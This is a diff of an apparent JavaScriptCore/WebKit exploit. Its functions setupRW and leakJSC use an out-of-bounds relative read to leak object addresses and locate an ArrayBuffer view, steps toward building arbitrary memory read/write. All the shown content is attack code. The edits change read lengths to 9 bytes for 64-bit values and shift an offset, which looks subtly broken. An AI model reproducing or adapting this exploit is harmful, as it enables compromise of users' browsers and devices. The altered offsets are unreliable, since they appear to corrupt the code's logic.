@@ -61,7 +61,7 @@ function setupRW() {
 
 	/* Retrieving the ArrayBuffer address using the relative read */
 	let diff = g_jsview_leak.sub(g_timer_leak).low32() - LENGTH_STRINGIMPL + 1;
-	let ab_addr = new Int64(str2array(g_relative_read, 7, diff + OFFSET_JSAB_VIEW_VECTOR));
+	let ab_addr = new Int64(str2array(g_relative_read, 9, diff + OFFSET_JSAB_VIEW_VECTOR));
 
 	/* Does the next JSObject is a JSView? Otherwise we target the previous JSObject */
 	let ab_index = g_jsview_leak.sub(ab_addr).low32();
@@ -261,12 +261,12 @@ function leakJSC() {
 					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
 					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
 					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
-					v = new Int64(str2array(g_relative_read, 8, i + 0x20));
+					v = new Int64(str2array(g_relative_read, 9, i + 0x20));
 				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
 					g_relative_read.charCodeAt(i + 0x13) === 0x42)
-					v = new Int64(str2array(g_relative_read, 8, i + 8));
+					v = new Int64(str2array(g_relative_read, 9, i + 9));
 			}
 			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
 				g_jsview_leak = v;
